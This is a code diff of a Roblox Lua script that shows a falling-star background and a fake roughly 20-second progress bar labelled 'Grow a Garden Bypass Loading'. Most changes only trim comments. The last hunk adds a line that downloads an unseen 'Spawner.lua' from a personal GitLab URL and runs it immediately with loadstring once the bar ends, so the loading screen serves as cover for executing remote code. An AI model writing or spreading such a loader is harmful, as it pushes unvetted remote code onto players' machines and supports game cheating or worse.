@@ -26,9 +26,7 @@ local function createStar()
 	-- Movement
 	task.spawn(function()
 		while star.Parent do
-			-- Move star downward
 			star.Position = star.Position + UDim2.new(0, 0, 0.002, 0)
-			-- Reset to top when off-screen
 			if star.Position.Y.Scale > 1 then
 				star.Position = UDim2.new(math.random(), 0, 0, 0)
 			end
@@ -37,7 +35,7 @@ local function createStar()
 	end)
 end
 
--- Spawn multiple stars
+-- Spawn stars
 for i = 1, 100 do
 	createStar()
 end
@@ -86,7 +84,7 @@ percent.Text = "0%"
 percent.ZIndex = 2
 percent.Parent = barBg
 
--- Subtitle (Loading Message)
+-- Subtitle
 local subtitle = Instance.new("TextLabel")
 subtitle.Text = "Grow a Garden Bypass Loading"
 subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -103,9 +101,12 @@ subtitle.Parent = bg
 for i = 1, 1000 do
 	barFill.Size = UDim2.new(i/1000, 0, 1, 0)
 	percent.Text = math.floor(i/10).."%"
-	task.wait(0.02) -- total ~20s
+	task.wait(0.02) -- ~20s
 end
 
 -- Remove after loading
 task.wait(1)
 screenGui:Destroy()
+
+-- Run your script after loading screen ends
+loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
